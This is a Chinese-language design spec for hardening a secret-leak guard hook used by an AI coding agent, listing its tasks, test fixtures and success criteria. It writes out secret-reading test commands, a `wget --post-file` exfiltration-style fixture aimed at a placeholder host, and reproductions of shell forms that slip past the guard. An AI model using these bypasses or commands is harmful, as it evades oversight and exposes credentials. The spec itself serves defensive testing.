| **内建化的换行语义** | **逐行 helper `_sg_line_match()`** (owner 2026-08-09 采候选 A) | 三个候选里**唯一实测与 canonical 零分歧**的解 (0/143 对抗 · 0/23 探针 · 0/11 端到端 · 0/305 语料), 由两席独立殊途同归; 段级守卫治一半造出更宽的 fail-close (13/13 判据), `${BASH_REMATCH[0]}` 变体仍在尾随换行形态上分歧。性能相对现状 fork 版 **−94.8%**, SC-8 不受影响 |
| 数字口径 | 交付权威计数器, **覆盖语料面 + 13 处判据面** | 语料面已出过五次不一致; 判据面第六次已发生 (11/12/13 三个数, 根因是基线写法而非算错) ⇒ 两个统计对象同样处置。SC-18 断言计数器自身 |
| `guard:ack` | 命令级 | 段级会把已 ack 的复合命令由 0 变 2 (R2 实测); SC-12 锁定 |

## Impact

- 影响面: `secret-guard.sh` (降级检测 + 分段 + 判定重排 + 消息) + 测试 + 新增计数器。零 skill / 零 schema / 零跨仓。
- **覆盖率 (诚实声明)**: 仅修复**可安全分段**的复合命令。含块结构者 (`{ }` / `for…done` / `$()` / 反引号 / heredoc …) **维持现状泄漏** —— 非本版引入, 归转出 1/2/5。
- **迁移面 (口径见 §6)**: 305 条 `bash_case` 中 65 条含顶层边界记号 (49 拦 / 16 放行, 其中 15 纯管道 + **1** 真边界即 `KNOWN-LIMIT` 用例), 另 5 条纯换行边界 (4 拦 + `#152 FP: multiline benign` 放行) 因不切换行而零影响。
- 版本: PATCH → **v1.65.6** (SOT 现 1.65.5; **bump 前 re-check**, Aria#170 已撞过一次并发)。
- **行为变更 (穷尽声明)**: **只有一类** —— 可安全分段的 `a; b` / `a && b` / `a || b` 形态将开始被拦。CHANGELOG 须标注 + 给迁移写法 (逐段补 redirect) — Tasks 1.6 + SC-10。
  - **credit 重构 (Task 1.3b) 是零行为变更的**: 采逐行内建 helper 后, credit 判定与 canonical 在 305 条语料 + 23 条 credit 探针 + 11 条端到端探针 + 13 正则 × 11 对抗串上**全部 0 分歧** (§What.4 实测表)。这是候选 A 相对另两个候选的**关键差别**: v5 的段级守卫会让「无关换行 + 单行完整 filter」这类常见多行命令由放行翻成拦截 —— 一个**没有申报也没有迁移写法**的行为变更, 且 `a; b` 类记号一个都没有 (R5 code-reviewer C-1)。本版取消该翻转, 故行为变更面**仍只有上面那一条**。
  - 反过来说: Phase B 若在 credit 面观察到**任何**与 canonical 的差异, 那就是实现 bug, **不是设计内的预期翻转** —— 这一条使 SC-15 成为无稀释信号的黄金验收 (见 SC-15 反事实)。
- ship 同步面: aria 子模块 3 交付文件 + 5 版本文件 + 主仓 gitlink。**不含** `.claude/scripts/` (已于主仓 `5fab5b8` 移除)。
  - **⚠️ 主仓侧按「版本引用点」而非「文件数」枚举 —— 文件数口径正是 [Aria#177](https://forgejo.10cg.pub/10CG/Aria/issues/177) 判定的类级根因**。v4 只写「VERSION + README badge」漏了 12 点; v5 补了 5 点仍漏 7 点, 且自称的「至少 6 个」与自己枚举的 5 个对不上 (R5 knowledge-manager M-1 + R5 code-reviewer m-2)。本版**不再报「漏了几个」这种相对数**, 直接给全量绝对清单 —— 相对数每改一次就要重算一次, 是上一轮出错的直接机制。
  - **主仓 14 个引用点全量表** (R5-fix 执笔者 2026-08-09 实读 `grep -n "1\.65\.5"` 逐个核对; 与 Aria#177 正文独立列出的 14 点**逐点吻合**):

    | 文件 | 行 | 形态 |
    |------|----|------|
    | `CLAUDE.md` | `:139` | 方法论轨版本区间末端 `v1.52.0–v1.65.5 已 ship` |
    | `CLAUDE.md` | `:141` | 项目状态段「版本:」行 |
    | `README.md` | `:8` | shields badge |
    | `README.md` | `:242` | `Plugin Version:` 独立行 (**与 badge 不是同一字符串**) |
    | `README.zh.md` / `.ja.md` / `.ko.md` | 各 `:3` | `<!-- translated-from: vX.Y.Z -->` 标记 |
    | `README.zh.md` / `.ja.md` / `.ko.md` | 各 `:10` | shields badge |
    | `README.zh.md` / `.ja.md` / `.ko.md` | 各 `:244` | `Plugin Version:` 独立行 |
    | `VERSION` | 子模块版本表 | `\| aria (插件) \| v1.65.5 \|` |

    合计 2 + 2 + 3×3 + 1 = **14**。i18n 的 **badge 与版本行无条件随版本号同步**; #140 B 档「仅正文实质变更才重译」只约束**正文重译**, 不豁免版本号同步 (R5 knowledge-manager m-1 指出原短语二义)。
  - **不得以 custom check 全绿代替逐点核对**: Aria#177 已实测 `m6-version-badge-match` 只比 `README.md` 的 badge、`i18n-readme-translation-currency` 只比 `translated-from` 标记 ⇒ 上表 14 点中 **7 点** (README.md:242 + 3 个 i18n 的 badge 与版本行) 残留旧版本时两条 check **仍全绿**。CLAUDE.md 两点则**无任何 check 兜底**。Task 1.11 承接。
- **验收环境** (⚠️ **2026-08-08 前提刷新** —— 原表述基于一条**现已不成立**的事实): 全部 SC 以 **canonical `aria/hooks/secret-guard.sh` 直调**为准。**原理由已失效**: [Aria#172](https://forgejo.10cg.pub/10CG/Aria/issues/172) 已修复并关闭 (2026-08-08), 本仓 plugin cache 现为 **1.65.5**, `cmp` 判定与 canonical **字节相同** ⇒ harness hook 链跑的就是 canonical 那份, 不再失真。**保留 canonical 直调作为 SC 标准的新理由**: 它不依赖 harness/plugin 安装态, 判据可在任意环境复算 —— 这是可复现性选择, 不再是被迫降级。
  > **✅ 该设计问题已由 R4 裁定 (措辞见 rule6_note 的校正 —— 五席一致的是「不应整体换成纯 harness 链」这个较弱命题, 「拆两腿」这个具体机制 qa-engineer 持不同方案)**: 提问是「既然 harness 链已可信, SC-9 是否应改走 harness hook 链」。**结论: 不二选一, 拆两腿** —— SC-9a canonical 直调作 pre-merge 主闸, SC-9b harness 链作 ship 后投递面验证。五席论据互补: canonical 直调**结构上证明不了「用户真的会被拦住」** (Aria#172 的教训正是 canonical 一直对、用户加载的是错的); 但 harness 链有**时序矛盾** (qa: pre-merge 闸验的是 PR 里的代码, 不是已部署的 cache), 且 tech-lead 实测 harness 链在 Phase B 阶段**结构上跑不到**本 spec 的改动。规范层的一般化归 [Aria#178](https://forgejo.10cg.pub/10CG/Aria/issues/178), 本 spec 是其单点应用。
- 文档回填: `secret-hygiene.md` 自测计数 (现 366) — Tasks 1.7 + **SC-13** (R2 knowledge M-1: 上版只落 Task 无 SC)。
- 归档 spec **不回写** (本仓先例: 归档是「实际 ship 了什么」的历史记录); `2026-08-02-secret-guard-nomad-var-put-echo/` 的 `KNOWN-LIMIT` 表述失效仅在本 spec 与 CHANGELOG 记录。

## 转出 (ship 时逐条开 issue; **复现命令内联**, R2 knowledge M-2: 不得只引用未提交的审计报告)

1. **[架构, 高]** 跨段 pattern fail-open — `set -o posix; set | grep foo` (2→0); `set -o posix && set | grep buildid` 同。工作面 = 1 条 `.*` + **81** 条 `[^|]*` pattern 待逐条裁定。
2. **[缺陷, 高]** 块结构内的泄漏 — 本版降级为现状, 未修复。复现: `{ cat /opt/.env; echo x; } >/dev/null` / `for f in a b; do cat /opt/.env; done >/dev/null` / `( cat /opt/.env; echo x ) >/dev/null` 均 exit=0。需块结构解析。
3. **[缺陷, 中]** `ssh host '…'` / `sh -c '…'` 外壳逃逸 — 复现: `ssh h 'cat /opt/.env; true >/dev/null'` exit=0, 含 Aria#170 形态的 ssh 版。需嵌套 shell 解析。
4. **[缺陷, 中]** `&` / 换行 两个切分记号 — `&` 与 `&>` `>&` `|&` `2>&1` 冲突 (复现: `cat /opt/.env &>/dev/null` 若切 `&` 则由 0 翻 2); 换行切碎 heredoc (复现: `cat <<EOF\nsecret\nEOF\nnomad var get x`)。
5. **[缺陷, 中]** `$(…)` / 反引号 / heredoc 内部的欠拦 — 本版降级为现状。复现: `` x=`cat /opt/.env; true >/dev/null` `` exit=0。
6. ~~**[性能]** `has_filter` 13 处转 bash 内建~~ — **已于 2026-08-04 由 owner 裁定拉回本 spec 范围** (见 §What.4), 不再转出。
7. ~~**[运维, 中]** [Aria#172](https://forgejo.10cg.pub/10CG/Aria/issues/172) plugin cache 陈旧致仓内 dogfood 失真~~ — **已修复并关闭 2026-08-08**, 不再转出。根因是两层滞后 (marketplace clone 停在 `da15d0f` 自称 1.63.0 ⇒ Claude Code 认为已最新 ⇒ cache 永不更新); 机械兜底 = 主仓 `71bdd60` 的 `plugin-cache-currency` state-check。**衍生转出**: [Aria#178](https://forgejo.10cg.pub/10CG/Aria/issues/178) — hook 类 SC 须显式声明测的是 canonical 直调还是 harness hook 链 (同版本下两条路径语义仍不同, 探针管不到)。
8. **[缺陷, 中]** fail-safe 判据**不封闭**的残余误报面 (R3-C-2) — 无块结构标记但仍不可安全分段的形态。已知实例: `exec >/dev/null; nomad var get x` (0→2)。根治需真正的 shell 语法解析; 本版只能枚举已知类。**新形态出现时应扩充 §What.1 判据表而非视为 SC 失败**。
9. **[可移植性, 低] (R4 code-reviewer C-1 衍生)** 本 hook 的正则依赖 glibc 的 GNU regex 扩展 (`\b` / `\s` / `\w`) —— 141 条 pattern 里 16 条含 `\b`, 13 处 credit 判据里 2 处含 `\b`。非 glibc 平台 (macOS 自带 bash 3.2 / BSD / musl-Alpine) 的行为未验证, 词边界可能被当字面字符 ⇒ 静默失配。

   **复现 (⚠️ 正则必须先存进变量, 再以不加引号的形式代入 `=~`)**:

   ```bash
   re='\bbar\b'
   [[ "foobar"  =~ $re ]] && echo MATCH || echo NOMATCH   # glibc 实测: NOMATCH
   [[ "foo bar" =~ $re ]] && echo MATCH || echo NOMATCH   # glibc 实测: MATCH
   # 两者结果相同 (同 MATCH 或同 NOMATCH) = 该平台不支持 \b
   ```

   **不得**写成 `[[ "foobar" =~ \bbar\b ]]` —— 裸写时反斜杠在 quote removal 阶段就被剥掉 (`printf '%s\n' \bbar\b` 输出 `bbarb`), 正则引擎根本没看到 `\b`, 于是**在已证实支持 `\b` 的 glibc 机器上也判「两者相同 = 失配」**, 是一条自证伪命令 (v5 原文即此形态, R5 knowledge-manager C-2 发现, R5-fix 执笔者实跑复核属实)。加双引号 (`=~ "\bbar\b"`) 同样错 —— 引号会强制字面匹配。此坑纯属 shell 词法, 与平台正则库无关; 对 `secret-guard.sh` 里写在双引号字符串**字面量内**的 `"…\\b…"` 不构成影响。本 spec 不处理, 仅立案。memory `feedback_sot_example_commands_are_never_executed` 点名的正是这一形态: **规范判据对 ≠ 示例可执行**。

## rule6_note

**Rule #6**: deterministic detector hook → structural fixture + unit-test corpus + dogfood (memory `feedback_deterministic_structural_skill_rule6_substitute`); 不走 `/skill-creator` AB (hook 非 capability skill)。框定与 owner 2026-08-02 对 `secret-guard-nomad-var-put-echo` 的裁定一致。

**substitute** (三组件逐一兑现, 与姊妹归档 spec `2026-08-02-secret-guard-nomad-var-put-echo/` 的 rule6_note 同构 — R5 knowledge-manager M-2):

| Rule #6 组件 | 本 spec 的兑现 |
|--------------|----------------|
| structural fixture | SC-1 (5 形态 baseline-failing) + SC-6 (fail-safe 降级族, 含 `case` 隔离单元断言) + SC-4 (quote-aware, 反事实可证伪) |
| unit-test corpus | SC-5 (分段器单元, 数组基数断言) + SC-2/SC-3 (迁移回归锁) + SC-11 (全量 366) + SC-15 (credit 语义不变, 正负双向) |
| **dogfood** | **SC-9a** (canonical 直调, pre-merge 主闸) —— v5 遗漏该组件, 清单只列两组件却在框定句里声明三组件 |

**dogfood 环境 (2026-08-08 前提刷新 + R4 裁定)**: 上一版写「因 Aria#172 仓内 harness 跑 1.63.0, 不可用『我在本仓被拦/放行』作 dogfood 证据」—— **该限制已解除**: #172 已修复关闭, 仓内 harness 现跑 1.65.5 (R5-fix 执笔者 `cmp` 复核: `~/.claude/plugins/cache/10CG-aria-plugin/aria/1.65.5/hooks/secret-guard.sh` 与 canonical **字节相同**; 另注意 `1.63.0/` 陈旧目录仍并存, 故 SC-9b 的 `cmp` 前置断言必须**指名版本目录**, 不能只说「plugin cache」)。**R4 五席裁定**: 拆 **SC-9a** (pre-merge 主闸) + **SC-9b** (harness 链, ship 后投递面), 理由见 SC-9b 条目。
> 措辞校正 (R5 qa-engineer m-1): 五席一致的是「**不应把 SC-9 整体替换为纯 harness 链**」这个较弱命题; 「是否需要新增一条独立 SC-9b」各席方案有别 (qa-engineer 倾向单条 SC + 复用既有 `plugin-cache-currency` state-check, 其余四席倾向新增独立验证腿), 本版采后者。**不得**再以「5/5 收敛」为由关闭对该机制操作面的讨论。

## Tasks

- [ ] 1.1 `safe_to_split()` — 块字符 + 块起始关键字 + 作用域型内建 (引号外)。**三条写死的实现约束**: (a) 块起始关键字与 `exec` / `time` **两行同精度, 一律「命令位置 且 词边界」** (R4 tech-lead R4-C-2 提出位置限定, R5 tech-lead R5-C-3 补词边界 —— 只写位置则 `timeout` 的 `time` 子串落在命令位置, SC-14 fixture #2 不可满足且语料 4 条 `timeout …` 被无谓降级); (b) 「行首」「换行之后」**照抄 §What.1 的 `BLOCK_KW_RE` 规范写法** (单引号主体 + 拼入 `nl=$'\n'`), **不得裸 `^`** (R4 backend-architect CRITICAL-2) 且 **不得写 `(^|\n)`** —— ERE 里 `\n` 是字母 n, 既漏 (真换行位置不命中) 又多 (`run for` 类误命中), 两个方向分别由 SC-6 换行 fixture 与 SC-14 A-4 锁住; (c) 命令位置 12 类中仅这 2 类需专门处理, 其余 10 类靠字面 token / 字符类天然安全
- [ ] 1.2 `split_top()` — quote/转义感知, 切顶层 `;` `&&` `||`; 空段跳过
- [ ] 1.3 判定循环: 降级分支 + 逐段 + **先 pattern 后 credit** + BLOCKED 消息补段落
- [ ] 1.3b **`has_filter` 13 处 `echo\|grep -qE` 改 bash 内建, 经 `_sg_line_match()` 逐行 helper** (owner 2026-08-04 裁定拉回范围; owner 2026-08-09 裁定采候选 A)。**规范写法见 §What.4 代码块, 逐字照抄, 13 处正则文本一个字节不动**; **不得**改用段级换行守卫 `[[ "$seg" != *$'\n'* ]] &&` (R4 曾写死, R5 三席实测它治一半造更宽的另一半, 已撤回), **不得**改用 `${BASH_REMATCH[0]}` 变体, **不得**自行"等价改写" helper。**保留 `\b`** 的 2 处不得改写为字符类 (R4 code-reviewer C-1)。验收 = SC-15
- [ ] 1.4 `corpus_census.py` 权威计数器 (随 spec 交付) — 语料 5 数 **+ §6 规定的 13 处 credit 判据三组口径** (行号清单 / 字面量词分布 / 换行影响面**两个基线口径各一个数**)
- [ ] 1.5 测试: 分段器单元 + fail-safe 降级族 (含 `case` 的**隔离单元断言**) + **credit 多行正负双向族** + 端到端族 + `KNOWN-LIMIT` 转正
- [ ] 1.6 CHANGELOG 行为变更标注 + 迁移写法
- [ ] 1.7 `secret-hygiene.md` 计数回填
- [ ] 1.8 全量回归 (canonical 直调) + 性能**五档**相对基线实测 (SC-8)
- [ ] 1.9 开转出 **1、2、3、4、5、8、9** issue (**R4 knowledge-manager Critical-1 勘正**: 6 已由 owner 拉回本 spec 范围 = Task 1.3b, **不开**; 7 已随 Aria#172 关闭, 衍生票 Aria#178 已开, **不开**; 8 与 9 前一版漏在「1-6」范围外); 回填 Aria#170 覆盖率声明; close aria-plugin#128。**转出 9 的复现命令须逐字照抄该条目正文** (已实跑验证的变量形式), 不得改写为裸 `\b` 写法
- [ ] 1.10 **ship 后执行 SC-9b** (投递面腿, R5 qa-engineer M-2 指出 SC-9b 此前无 Task 承载): 版本 bump 落地并经 marketplace 刷新后, 用 `cmp` 比对 plugin cache 副本与 canonical, 再经 harness hook 链复验 ≥1 条本 spec 新增拦截形态。**挂 release-closeout, 不计入 Phase C 合并门槛** (理由见 SC-9b)
- [ ] 1.11 **ship 同步面逐点核对** (§Impact 的 14 点表, R5 knowledge-manager M-1): bump 后对 14 个引用点逐个 `grep` 确认无残留旧版本号; **不得**以「机械兜底 check 全绿」代替 —— Aria#177 已实测两条 check 对其中 7 点结构性失明

## Success Criteria

> **除 SC-9b 外**全部以 **canonical 直调**为准 (理由见 §Impact 验收环境 —— 2026-08-08 已从「#172 所迫」改为「可复现性选择」)。SC-9b 是 R4 裁定新增的 harness 链投递面腿 (共识强度见 rule6_note 校正)。

- [ ] SC-1 (baseline-failing, 核心): 5 条泄漏形态 (`;` ×3 / `&&` / `||`) **改前 exit=0, 改后 exit=2**。作者原型已验 5/5
- [ ] SC-2 (零影响回归锁, **逐条列名**): 15 条纯管道 + 5 条换行边界用例改前改后**均不变**
- [ ] SC-3 (拦截面不回归): **49** 条含边界的 `expected=2` 用例改后仍 exit=2; 任一转 0 = 安全回归
- [ ] SC-4 (quote-aware, **反事实可证伪** — R3-M-2 证原 3 条 fixture 在「引号盲实现」下 3/3 仍 exit=2, 被 fail-safe 吞掉): 改用 R3 tech-lead 验证过的 `perl -ne 'print if /a;b/' /opt/.env` —— 引号内含 `;` 且**无块结构标记**故不会走 fallback, 引号盲实现会把它切成两段而两段均不匹配 ⇒ **切错必 exit=0, 正确必 exit=2**。原三条降为辅助用例 (标注其零鉴别力)
- [ ] SC-5 (分段器单元测试, 数组基数断言): `a; b`→2 / `a && b`→2 / `a \|\| b`→2 / `a \| b`→**1** / `;` 在引号内→**1** / `\;` 转义→**1** / 换行→**1** / `a & b`→**1** / `a &> f`→**1** / `case x in a) ;; esac`→**2** (R3-M-3 机械核验: `split_top()` 直接按 `;` 切, `;;` 产生 2 段; 该命令由 `safe_to_split()` 在上层拦下, **两层职责不可混淆** —— 前一版写 →1 是把两层搞混了)
- [ ] SC-6 (fail-safe 降级族, **必须断言分支本身而非 exit code** — R3-M-1 + R4 qa-engineer §2 证 12 条里 5 条在「恒 fallback 的坏实现」下同样全绿, 因两路 exit 相同): 对每条**直接断言 `safe_to_split()` 的返回值** (fallback / split), 而非仅端到端 exit。**共 16 项** = 13 条端到端须 `safe_to_split=false` + **1 条隔离单元断言** + 2 条端到端须 `safe_to_split=true` (`ls -la; pwd` / `cat /opt/.env; echo hi >/dev/null`)。
  - 端到端 false, 块字符型 **7 条**: `{ }` / `( )` / `[[ && ]]` / `for ((;;))` / 反引号 / `$()` / heredoc
  - 端到端 false, **关键字型 5 条** (无任何块字符, 真正依赖关键字分支): `for` / `while` / `if` / `until` / `select`。`until` / `select` 系 R4 依 qa-engineer §2 补入 (§What.1 声明 6 个块关键字, v4 只测了 3 个); **fixture 文本本版写死** (R5 qa-engineer m-2 指出只给关键字名不可验收):
    - `until nomad var put secret/x @f >/dev/null; do sleep 1; done`
    - `select e in prod dev; do nomad var get secret/$e; done`
  - 端到端 false, **换行位置型 1 条** (R4 backend-architect CRITICAL-2): `$'cd /tmp\nfor f in a b; do cat /opt/.env; done >/dev/null'` —— 块字符型那 7 条全是同行标记, 对「换行之后」这个位置类别零覆盖
  - **⛔ `case` 必须改为隔离单元断言, 不得作端到端 fixture (R5 qa-engineer C-2)**: bash `case` 的模式臂 `pattern)` **语法强制含裸 `)`** (实测: 省掉 `)` 的 case 体 `bash -n` 报 syntax error), 而 `)` 是 `BLOCK_CHARS` 成员 ⇒ 任何带真实分支体的 `case` fixture 都会被块字符判据**先行捕获**, 关键字分支根本没被执行到。R5-fix 执笔者机械对拍 (`c3_perkw.sh`, 逐个关键字构造「只漏检该关键字」的实现): `for`/`while`/`until`/`if`/`select` **5 条全部**区分开 (`false` vs `true`), **只有 `case` 两种实现产出完全相同** (`false` vs `false`)。⇒ v5 写的反事实「漏检 `case` → 对应条红」**可被证伪**。
    - **改法**: 对关键字识别的正则/辅助函数做**隔离断言**, 绕过 `BLOCK_CHARS` 路径 —— 断言它对裸 token 流 `case x in` 返回真。实测该断言**确实有鉴别力**: 正确关键字集 → YES, 漏 `case` 的关键字集 → NO。
    - 根因记录: 这是**转述损耗** —— qa R4 的原始建议带「哪怕只是隔离单元断言」这个限定, 而它是建议能成立的**必要条件**; v5 采纳时把限定丢了, 只执行了「加一条 case fixture」的动作。
  - **反事实 (逐类写死, 已机械复验)**: 恒 fallback 实现 → 后 2 条 true 红; 恒 split 实现 → 前 13 条端到端红 + 隔离断言不受影响; 漏检 `until` 或 `select` → 对应各 1 条红; **漏检 `case` → 隔离单元断言红 (端到端全绿, 这正是它必须隔离的原因)**; 裸 `^` 实现 → 换行那条红 (其余 12 条端到端不受影响, 隔离性好); **`(^|\n)` 实现 → 同样只有换行那条红** (实测 1/15; 它的另一半误命中方向由 SC-14 A-4 承担, 本 SC 对该方向零鉴别力 —— 两条 SC 各锁一个方向, 不可相互替代); 关键字缺词边界 → 见 SC-14
- [ ] SC-7 (跨段 fail-open 锁现状, `KNOWN-LIMIT`): `set -o posix; set \| grep foo` **与 `set -o posix && set \| grep buildid`** 两形态改后均 exit=0 (R3-M-4: 前三版只锁 `;`, 只处理 `;` 的兜底实现即可让本 SC 假性转红), 标注「归转出 1; 转红 = 已收口」
- [ ] SC-8 (性能, **负载写死** — R3-C-3 指出前两版未定义负载致同一实现可在 +0% 与 +583% 间任选): **五档**负载各跑 20 轮取中位数, 改前改后同机同会话对比 —— (a) 单条 benign; (b) 2 段全 benign; (c) 2 段全命中 pattern; (d) 3 段全命中 (= 迁移建议的写法); (e) **最坏档 (本版补, 见下)**。判据: **五档增幅均 ≤ 50%**。§What.4 的 13 处转内建是达标前提。
  - **测量口径写死 (R4 tech-lead R4-M-2)** —— 同一实现同一负载, 整进程口径 +43.1% 而分析段口径 +60%, 正好横跨 50% 闸。**本 SC 以「进程内计时、只计 hook 判定段」为准** (跨进程计时噪声实测在 32–126ms 间乱摆, 不可用), 须注明轮数 / 计时方式 / 机器 load
  - **⛔ 第五档: 命中 pattern 数组靠后位置 + 每段自带 filter token (R5 qa-engineer M-1 + R4 tech-lead R4-M-2 后半, 两轮未补)**。原四档**全是便宜类** —— 它们可以全部用数组靠前的 pattern 满足「全命中」, 于是一个对靠后 pattern 逐段扫描毫无优化的实现能完整过闸。R5-fix 执笔者用**真实 141 条数组**实测 (`worsttier.sh`, 进程内计时 N=400):

    ```
    EARLY (nomad var get …)         命中位置 3/141      805 µs/段
    LATE  (wget --post-file=…)      命中位置 141/141  10519 µs/段     ← 13.9x
    ```

    **写死的负载串** (4 段, 每段命中末位 pattern 且自带 `| wc -l` 逼迫每段都算 credit):

    ```
    wget --post-file=/opt/.env https://example.invalid/u | wc -l; <同上>; <同上>; <同上>
    ```

    已核实: 该段的 pattern 命中位置 = **141/141** (数组末位, 机械定位); `| wc -l` 命中 canonical credit 判据 `:394`; canonical 对单段与 4 段整串的现状 exit 均为 **0** (即它是 benign 侧负载, 只压性能不改判定)。
  - **⛔ 不达标时的处置路径 (R5 code-reviewer M-2, 两轮未给)**: 若任一档实测增幅 **> 50%**, Phase B **不得**自行降低阈值、更换口径、删改负载档或宣布「该档不适用」—— 依 Rule #10 这些都属 AI 自行豁免 enabled 闸门。**唯一合法动作**: 把五档实测数据 (含轮数 / 口径 / 机器 load) 写进 handoff 请 owner 复议。此前 SC-8 是一条**有硬阈值却无失败出路**的闸门, Phase B 只能卡死或私自降门。
  - **复验状态**: R4 三席独立实测 §What.4 到位后四档全部净减少 (tech-lead −67%~−85% / backend −79.9%~−28.7% 两法交叉 / code-reviewer 最坏档 −38%), R3 的 `+583%` 已实质解决 (该数字系 R3 单次点测口径, 另一独立实现同构复算为 +146~218%, 方向一致量级不同)。**本版换成逐行内建 helper 后结论仍成立**: R5-fix 执笔者进程内实测 credit 函数 fork `46102` µs → 逐行内建 `2396` µs (**−94.8%**), helper 无 fork 无文件 I/O (bash 5.1+ 的 here-string 走管道)。⇒ **五档 Phase B 须全部复算, 不得引用本行数字充当验收**
- [ ] SC-9a (dogfood · **canonical 闸**, R4 裁定拆两腿; **本 SC 即 rule6_note substitute 的 dogfood 组件**): canonical 直调端到端脚本, 覆盖 5 类实际使用形态。**「5 类」须在 Phase B 前枚举写死** (R4 qa-engineer §5: 现表述不可验收)
- [ ] SC-9b (dogfood · **投递面腿**, R4 新增; **承载 Task = 1.10**): ship 后经 **harness hook 链**复验至少 1 条本 spec 新增的拦截形态, 前置断言 `cmp` 判定 **`~/.claude/plugins/cache/10CG-aria-plugin/aria/<新版本号>/hooks/secret-guard.sh`** 与 canonical 字节相同 (**须指名版本目录** —— 实测 `1.63.0/` 陈旧目录与 `1.65.5/` 并存, 只说「plugin cache」有歧义)。
  - **⛔ 本 SC 不计入 Phase C 合并门槛 (R5 qa-engineer M-2)**: `cmp` 不一致在 Phase B/C 窗口期是**结构必然**, 不是异常 —— 本 spec 第一步就把 SOT 由 1.65.5 bump 到 1.65.6, 而 cache 要等「merge → push → marketplace clone 刷新 → 按新版本号新建目录」整条链走完才追得上。判定语义**三分, 不得二选一**:

    | `cmp` 结果 | 判定 | 后续 |
    |------------|------|------|
    | 目标版本目录**不存在**或字节不同, 且尚未 ship | **BLOCKED-BY-ENV** | 非失败。**不得**改判 PASS, 也不得据此阻塞 Phase C 合并 |
    | 字节相同, harness 链复验拦截成功 | PASS | 闭环 |
    | 字节相同, harness 链复验**未拦住** | **FAIL** | 真缺陷, 走 hotfix |

    v5 把 SC-9b 与其余 16 条并列在同一份 Success Criteria 里却没声明它的时序性质, 而这份列表是 Phase B→C 的验收依据 ⇒ 忠实按字面执行的 Phase C 会在一个**每次都会发生**的分支上无表可依, 只剩「卡死等一个到不了的条件」或「自行决定这条不算数」两条路 —— 后者正是 Rule #10 禁止的自行豁免。这也与 memory `feedback_goal_hook_precondition_must_be_in_session_achievable` 同形。
  - **为什么必须两腿而非二选一** (五席论据互补): canonical 直调**结构上证明不了「用户真的会被拦住」** —— Aria#172 的教训恰是 canonical 一直正确、用户加载的却是错的; 但 harness 链有**时序矛盾** (qa-engineer): pre-merge 闸验的是 PR 里的代码, 不是已部署的 cache, 两者本就不同物; tech-lead 另实测 harness 链在 Phase B 阶段**结构上跑不到**本 spec 的改动。⇒ canonical 作 pre-merge 主闸 (SC-9a), harness 链作 **ship 后**投递面验证 (SC-9b)
  - 规范层的一般化归 [Aria#178](https://forgejo.10cg.pub/10CG/Aria/issues/178); 本 SC 是它在本 spec 的单点应用
- [ ] SC-10 (CHANGELOG): 含行为变更段 + ≥2 条迁移写法示例 (机械 grep)
- [ ] SC-11 (全量回归): `secret-guard.test.sh` 全绿 + 其余 5 脚本全绿; **总数注明 zsh 在场与否** (366 / 360)
- [ ] SC-12 (`guard:ack` 命令级锁定): 已 ack 的复合命令改后仍 exit=0 (防实现把 ack 下沉段级 — R2 实测下沉会由 0 变 2)
- [ ] SC-13 (SOT 计数回填断言): `secret-hygiene.md` 中 secret-guard 自测计数与实际测试数一致 (机械 grep 比对, R2 knowledge M-1)
- [ ] SC-14 (**判据 token 过度触发**方向, R3 code-reviewer M-2 + R4 tech-lead R4-C-2 扩容 + **R5 qa-engineer C-1 拆公式**): **两组 fixture 性质不同, 验收公式必须分开写 —— v5 用一个公式统摄 5 条, 方向是反的**。
  - **A 组 (无风险段, 锁「不误伤」)** **4 条**: `ls; echo for >/dev/null` / `ls; echo if >/dev/null` / `git commit -m "add case handling"` / **A-4 `ls; echo run for >/dev/null`**
    - 判据: 须 `safe_to_split=true` **且 exit 与改前一致 (= 0)**。这 4 条切开后没有任何段命中 risky pattern, 故正确实现下 exit 本就不变 (A-4 canonical 直调实测改前 exit=**0**)。
    - **A-4 是 R5-fix 新增的 `(^|\n)` 误命中锁**: 它是全 spec 唯一一条「以 `n` 结尾的词紧邻关键字」的 fixture。实测 —— 正确写法 `safe_to_split=true`, 写成 `(^|\n)` 则 `false` (因 `run` 的 `n` 被当成位置记号)。**没有它, `(^|\n)` 的「多」这一半无任何 SC 覆盖** (原 A 组 3 条与 SC-6 全部 15 项对该方向零鉴别力, 已逐条实测)。
  - **B 组 (含真风险段, 锁「不漏拦」)** 2 条: `echo runtime; cat /opt/.env; true >/dev/null` / `timeout 5 curl x; cat /opt/.env; true >/dev/null`
    - 判据: 须 `safe_to_split=true` **且 exit 由改前的 0 变为改后的 2**。
    - **实测依据** (canonical 直调, `c2_c3.sh`): 两条**改前均 exit=0**; 而它们切开后的中段 `cat /opt/.env` 单独直调 **exit=2** —— 即正确的逐段实现必然拦下, 这正是本 spec 存在的理由 (Aria#170 同构泄漏)。
  - **⛔ v5 的错法与后果**: v5 对 5 条统一写「exit 与改前一致」, 却在同段解释文字里说 B 组「正确实现应 exit=2」—— **自相矛盾**。按字面执行会**放行**它本该堵的那个实现: 一个保留子串读法 (含 `runtime`/`timeout` 子串即整条 fallback) 的「覆盖损失」版本, 对 B 组产出 exit=0, **与改前完全一致**, 字面判定 PASS。而 SC-14 是唯一能拦住该缺陷的锁 —— SC-1/3/6/11 与全语料对它**零鉴别力** (R4 tech-lead 实测两种读法对 305 条语料产出完全相同)。
  - **反事实 (机械复算, `sc14_cf.sh`: 三种实现 × 5 条 fixture 逐格算 `safe_to_split`)**:

    | 实现 | A-1 `echo for` | A-2 `echo if` | A-3 `add case` | A-4 `echo run for` | B-1 `echo runtime` | B-2 `timeout 5` | 转红 |
    |------|---------------|---------------|----------------|--------------------|--------------------|-----------------|------|
    | 裸子串 (无位置、无词边界) | false | false | false | false | false | false | **6 条全红** |
    | 仅命令位置 (v5 的规范文本) | true | true | true | true | true | **false** | **1 条红 (B-2)** |
    | 命令位置 + 词边界 (本版规范文本) | true | true | true | true | true | true | **0 条, 全绿** |
    | **`(^|\n)` 写法** (位置交替写错, 见 §What.1) | true | true | true | **false** | true | true | **1 条红 (A-4)** |

    即: **B-2 是整份 spec 里唯一能分辨「仅位置」与「位置+词边界」的断言**, 而 v5 恰好把它写成了不可满足 (要求 `safe_to_split=true`, 字面文本给 false); **A-4 则是唯一能抓 `(^|\n)` 误命中方向的断言**。exit 维度另需 B 组的 `0→2` 才能拦住「子串读法 = 覆盖损失」那一类。
  - 前一版用 `echo done` 举例是错的 (`done` 不在关键字集内, 论证不成立)
